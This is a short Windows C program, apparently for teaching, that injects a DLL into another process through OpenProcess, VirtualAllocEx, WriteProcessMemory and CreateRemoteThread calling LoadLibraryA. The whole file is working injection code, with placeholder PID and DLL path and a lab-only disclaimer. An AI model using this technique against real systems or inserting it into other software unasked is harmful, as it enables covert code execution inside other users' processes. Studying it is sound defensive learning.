#include <windows.h>
#include <stdio.h>

// Disclaimer: Use this code only in lab environments you control. It is meant for learning how malware techniques work — not for real-world use.

int main() {
    // Target process ID (replace with the actual PID of notepad.exe or something safe)
    DWORD pid = 1234;

    // DLL path to inject (make sure this path exists and the DLL is benign)
    const char* dllPath = "C:\\Path\\To\\Your\\DLL.dll";

    // Open the target process with required permissions
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // Allocate memory in the target process
    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Write the DLL path to the allocated memory
    WriteProcessMemory(hProcess, allocMem, dllPath, strlen(dllPath) + 1, NULL);

    // Get the address of LoadLibraryA
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    // Create a remote thread that calls LoadLibraryA with our DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)loadLibAddr,
                                        allocMem, 0, NULL);

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("DLL injected!\n");
    return 0;
}
